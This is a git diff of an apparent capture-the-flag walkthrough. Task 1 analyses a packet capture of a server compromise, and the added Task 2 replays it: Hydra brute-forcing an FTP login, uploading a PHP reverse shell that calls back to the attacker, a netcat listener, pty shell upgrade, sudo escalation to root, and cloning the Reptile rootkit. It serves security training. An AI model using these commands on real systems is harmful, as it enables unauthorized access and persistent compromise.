@@ -72,109 +72,101 @@ In the description of the FTP-DATA frame :
 
 Right-click on the TCP lines below the HTTP one and select Follow -> TCP until you find something interesting :
 
-Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+> Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
  22:26:54 up  2:21,  1 user,  load average: 0.02, 0.07, 0.08  <BR>
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT  <BR>
-jenny    tty1     -                20:06   37.00s  1.00s  0.14s -bash  <BR>
-uid=33(www-data) gid=33(www-data) groups=33(www-data)  <BR>
-/bin/sh: 0: can't access tty; job control turned off  <BR>
-$ whoami  <BR>
-www-data  <BR>
-$ ls -la  <BR>
-total 1529956  <BR>
-drwxr-xr-x  23 root root       4096 Feb  1 19:52 .  <BR>
-drwxr-xr-x  23 root root       4096 Feb  1 19:52 ..  <BR>
-drwxr-xr-x   2 root root       4096 Feb  1 20:11 bin  <BR>
-drwxr-xr-x   3 root root       4096 Feb  1 20:15 boot  <BR>
-drwxr-xr-x  18 root root       3880 Feb  1 20:05 dev  <BR>
-drwxr-xr-x  94 root root       4096 Feb  1 22:23 etc  <BR>
-drwxr-xr-x   3 root root       4096 Feb  1 20:05 home  <BR>
-lrwxrwxrwx   1 root root         34 Feb  1 19:52 initrd.img -> boot/initrd.img-4.15.0-135-generic  <BR>
-lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic  <BR>
-drwxr-xr-x  22 root root       4096 Feb  1 22:06 lib  <BR>
-drwxr-xr-x   2 root root       4096 Feb  1 20:08 lib64  <BR>
-drwx------   2 root root      16384 Feb  1 19:49 lost+found  <BR>
-drwxr-xr-x   2 root root       4096 Jul 25  2018 media  <BR>
-drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt  <BR>
-drwxr-xr-x   2 root root       4096 Jul 25  2018 opt  <BR>
-dr-xr-xr-x 117 root root          0 Feb  1 20:23 proc  <BR>
-drwx------   3 root root       4096 Feb  1 22:20 root  <BR>
-drwxr-xr-x  29 root root       1040 Feb  1 22:23 run  <BR>
-drwxr-xr-x   2 root root      12288 Feb  1 20:11 sbin  <BR>
-drwxr-xr-x   4 root root       4096 Feb  1 20:06 snap  <BR>
-drwxr-xr-x   3 root root       4096 Feb  1 20:07 srv  <BR>
--rw-------   1 root root 1566572544 Feb  1 19:52 swap.img  <BR>
-dr-xr-xr-x  13 root root          0 Feb  1 20:05 sys  <BR>
-drwxrwxrwt   2 root root       4096 Feb  1 22:25 tmp  <BR>
-drwxr-xr-x  10 root root       4096 Jul 25  2018 usr  <BR>
-drwxr-xr-x  14 root root       4096 Feb  1 21:54 var  <BR>
-lrwxrwxrwx   1 root root         31 Feb  1 19:52 vmlinuz -> boot/vmlinuz-4.15.0-135-generic  <BR>
-lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic  <BR>
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'  <BR>
-www-data@wir3:/$ su jenny  <BR>
-su jenny  <BR>
-Password: password123  <BR>
-  <BR>
-jenny@wir3:/$ sudo -l  <BR>
-sudo -l  <BR>
-[sudo] password for jenny: password123  <BR>
-  <BR>
-Matching Defaults entries for jenny on wir3:  <BR>
-    env_reset, mail_badpass,  <BR>
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  <BR>
-  <BR>
-User jenny may run the following commands on wir3:  <BR>
-    (ALL : ALL) ALL  <BR>
-jenny@wir3:/$ sudo su  <BR>
-sudo su  <BR>
-root@wir3:/# whoami  <BR>
-whoami  <BR>
-root  <BR>
-root@wir3:/# cd  <BR>
-cd  <BR>
-root@wir3:\~# git clone https://github.com/f0rb1dd3n/Reptile.git  <BR>
-git clone https://github.com/f0rb1dd3n/Reptile.git  <BR>
-Cloning into 'Reptile'...  <BR>
-remote: Enumerating objects: 217, done..[K  <BR>
-remote: Counting objects:   0% (1/217).[K  <BR>
-...  <BR>
-remote: Counting objects: 100% (217/217), done..[K  <BR>
-remote: Compressing objects:   0% (1/152).[K  <BR>
-...  <BR>
-remote: Compressing objects: 100% (152/152), done..[K  <BR>
-Receiving objects:   0% (1/1010)     <BR>
-...  <BR>
-Receiving objects: 100% (1010/1010), 472.55 KiB | 1.73 MiB/s, done.  <BR>
-Resolving deltas:   0% (0/499)     <BR>
-...  <BR>
-Resolving deltas: 100% (499/499), done.  <BR>
-root@wir3:\~# cd Reptile  <BR>
-cd Reptile  <BR>
-root@wir3:\~/Reptile# ls -la  <BR>
-ls -la  <BR>
-total 44  <BR>
-drwxr-xr-x 7 root root 4096 Feb  1 22:27 .  <BR>
-drwx------ 4 root root 4096 Feb  1 22:27 ..  <BR>
-drwxr-xr-x 2 root root 4096 Feb  1 22:27 configs  <BR>
-drwxr-xr-x 8 root root 4096 Feb  1 22:27 .git  <BR>
--rw-r--r-- 1 root root    8 Feb  1 22:27 .gitignore  <BR>
--rw-r--r-- 1 root root 1922 Feb  1 22:27 Kconfig  <BR>
-drwxr-xr-x 7 root root 4096 Feb  1 22:27 kernel  <BR>
--rw-r--r-- 1 root root 1852 Feb  1 22:27 Makefile  <BR>
--rw-r--r-- 1 root root 2183 Feb  1 22:27 README.md  <BR>
-drwxr-xr-x 4 root root 4096 Feb  1 22:27 scripts  <BR>
-drwxr-xr-x 6 root root 4096 Feb  1 22:27 userland  <BR>
-root@wir3:\~/Reptile# make  <BR>
-make  <BR>
-make[1]: Entering directory '/root/Reptile/userland'  <BR>
-Makefile:10: ../.config: No such file or directory  <BR>
-make[1]: *** No rule to make target '../.config'.  Stop.  <BR>
-make[1]: Leaving directory '/root/Reptile/userland'  <BR>
-Makefile:56: recipe for target 'userland_bin' failed  <BR>
-make: *** [userland_bin] Error 2  <BR>
-root@wir3:\~/Reptile#  <BR>
+> USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT  <BR>
+> jenny    tty1     -                20:06   37.00s  1.00s  0.14s -bash  <BR>
+> uid=33(www-data) gid=33(www-data) groups=33(www-data)  <BR>
+> /bin/sh: 0: can't access tty; job control turned off  <BR>
+> $ whoami  <BR>
+> www-data  <BR>
+> $ ls -la  <BR>
+> total 1529956  <BR>
+> drwxr-xr-x  23 root root       4096 Feb  1 19:52 .  <BR>
+> drwxr-xr-x  23 root root       4096 Feb  1 19:52 ..  <BR>
+> drwxr-xr-x   2 root root       4096 Feb  1 20:11 bin  <BR>
+> drwxr-xr-x   3 root root       4096 Feb  1 20:15 boot  <BR>
+> drwxr-xr-x  18 root root       3880 Feb  1 20:05 dev  <BR>
+> drwxr-xr-x  94 root root       4096 Feb  1 22:23 etc  <BR>
+> drwxr-xr-x   3 root root       4096 Feb  1 20:05 home  <BR>
+> lrwxrwxrwx   1 root root         34 Feb  1 19:52 initrd.img -> boot/initrd.img-4.15.0-135-generic  <BR>
+> lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic  <BR>
+> drwxr-xr-x  22 root root       4096 Feb  1 22:06 lib  <BR>
+> drwxr-xr-x   2 root root       4096 Feb  1 20:08 lib64  <BR>
+> drwx------   2 root root      16384 Feb  1 19:49 lost+found  <BR>
+> drwxr-xr-x   2 root root       4096 Jul 25  2018 media  <BR>
+> drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt  <BR>
+> drwxr-xr-x   2 root root       4096 Jul 25  2018 opt  <BR>
+> dr-xr-xr-x 117 root root          0 Feb  1 20:23 proc  <BR>
+> drwx------   3 root root       4096 Feb  1 22:20 root  <BR>
+> drwxr-xr-x  29 root root       1040 Feb  1 22:23 run  <BR>
+> drwxr-xr-x   2 root root      12288 Feb  1 20:11 sbin  <BR>
+> drwxr-xr-x   4 root root       4096 Feb  1 20:06 snap  <BR>
+> drwxr-xr-x   3 root root       4096 Feb  1 20:07 srv  <BR>
+> -rw-------   1 root root 1566572544 Feb  1 19:52 swap.img  <BR>
+> dr-xr-xr-x  13 root root          0 Feb  1 20:05 sys  <BR>
+> drwxrwxrwt   2 root root       4096 Feb  1 22:25 tmp  <BR>
+> drwxr-xr-x  10 root root       4096 Jul 25  2018 usr  <BR>
+> drwxr-xr-x  14 root root       4096 Feb  1 21:54 var  <BR>
+> lrwxrwxrwx   1 root root         31 Feb  1 19:52 vmlinuz -> boot/vmlinuz-4.15.0-135-generic  <BR>
+> lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic  <BR>
+> $ python3 -c 'import pty; pty.spawn("/bin/bash")'  <BR>
+> www-data@wir3:/$ su jenny  <BR>
+> su jenny  <BR>
+> Password: password123  <BR>
+>   <BR>
+> jenny@wir3:/$ sudo -l  <BR>
+> sudo -l  <BR>
+> [sudo] password for jenny: password123  <BR>
+>   <BR>
+> Matching Defaults entries for jenny on wir3:  <BR>
+>     env_reset, mail_badpass,  <BR>
+>     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  <BR>
+>   <BR>
+> User jenny may run the following commands on wir3:  <BR>
+>     (ALL : ALL) ALL  <BR>
+> jenny@wir3:/$ sudo su  <BR>
+> sudo su  <BR>
+> root@wir3:/# whoami  <BR>
+> whoami  <BR>
+> root  <BR>
+> root@wir3:/# cd  <BR>
+> cd  <BR>
+> root@wir3:\~# git clone https://github.com/f0rb1dd3n/Reptile.git  <BR>
+> git clone https://github.com/f0rb1dd3n/Reptile.git  <BR>
+> Cloning into 'Reptile'...  <BR>
+> remote: Enumerating objects: 217, done..[K  <BR>
+> remote: Counting objects: 100% (217/217), done..[K  <BR>
+> remote: Compressing objects: 100% (152/152), done..[K  <BR>
+> Receiving objects: 100% (1010/1010), 472.55 KiB | 1.73 MiB/s, done.  <BR>
+> Resolving deltas: 100% (499/499), done.  <BR>
+> root@wir3:\~# cd Reptile  <BR>
+> cd Reptile  <BR>
+> root@wir3:\~/Reptile# ls -la  <BR>
+> ls -la  <BR>
+> total 44  <BR>
+> drwxr-xr-x 7 root root 4096 Feb  1 22:27 .  <BR>
+> drwx------ 4 root root 4096 Feb  1 22:27 ..  <BR>
+> drwxr-xr-x 2 root root 4096 Feb  1 22:27 configs  <BR>
+> drwxr-xr-x 8 root root 4096 Feb  1 22:27 .git  <BR>
+> -rw-r--r-- 1 root root    8 Feb  1 22:27 .gitignore  <BR>
+> -rw-r--r-- 1 root root 1922 Feb  1 22:27 Kconfig  <BR>
+> drwxr-xr-x 7 root root 4096 Feb  1 22:27 kernel  <BR>
+> -rw-r--r-- 1 root root 1852 Feb  1 22:27 Makefile  <BR>
+> -rw-r--r-- 1 root root 2183 Feb  1 22:27 README.md  <BR>
+> drwxr-xr-x 4 root root 4096 Feb  1 22:27 scripts  <BR>
+> drwxr-xr-x 6 root root 4096 Feb  1 22:27 userland  <BR>
+> root@wir3:\~/Reptile# make  <BR>
+> make  <BR>
+> make[1]: Entering directory '/root/Reptile/userland'  <BR>
+> Makefile:10: ../.config: No such file or directory  <BR>
+> make[1]: *** No rule to make target '../.config'.  Stop.  <BR>
+> make[1]: Leaving directory '/root/Reptile/userland'  <BR>
+> Makefile:56: recipe for target 'userland_bin' failed  <BR>
+> make: *** [userland_bin] Error 2  <BR>
+> root@wir3:\~/Reptile#  <BR>
 
-whoami
+`whoami`
 
 #### What is the computer's hostname ?
 
@@ -182,11 +174,11 @@ wir3
 
 #### Which command did the attacker execute to spawn a new TTY shell ?
 
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+`python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
 #### Which command was executed to gain a root shell ?
 
-sudo su
+`sudo su`
 
 #### The attacker downloaded something from GitHub. What is the name of the GitHub project ?
 
@@ -198,3 +190,69 @@ Rootkit.
 
 ### Task 2
 
+#### The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary.
+
+#### Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list.
+
+On the AttackBox, browse to '/root/Desktop/Tools/Password Attacks'.
+
+Launch Hydra :
+`hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.137`
+
+The new password is : 987654321
+
+#### Change the necessary values inside the web shell and upload it to the webserver
+
+Open in a text editor /usr/share/webshells/php/php-reverse_shell.php and edit lines 49 and 50 :
+
+> $ip = 'PUT_THE_MACHINE_ATTACK_BOX_IP';  // CHANGE THIS to ifconfig eth0 of the ATTACKBOX machine
+> 
+> $port = 4444;       // CHANGE THIS (optional)
+
+Then, upload it to /var/www/html and chmod 777 :
+
+`ftp 10.10.10.137`
+
+`Enter Name : jenny`
+
+`Enter Password : 987654321`
+
+`ftp> pwd`
+
+> 257 "/var/www/html" is the current directory
+
+`ftp> ls`
+
+> 200 PORT command successful. Consider using PASV.
+> 
+> 150 Here comes the directory listing.
+> 
+> -rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
+> 
+> -rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
+
+`ftp> put /usr/share/webshells/php/php-reverse-shell.php shell.php`
+
+#### Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.
+
+`nc -nlvp 4444` (use same port as in previous question)
+
+#### Become root!
+
+Remember question 12) from Task 1 :
+`python3 -c 'import pty; pty.spawn("/bin/bash")'`
+
+Switch to user jenny since we know her password :
+`su jenny`
+
+Enter her password : `987654321`
+
+`sudo -l` to see her rights.
+
+#### Read the flag.txt file inside the Reptile directory
+
+`sudo dir root`
+
+`sudo dir root/Reptile`
+
+`sudo cat root/Reptile/flag.txt`
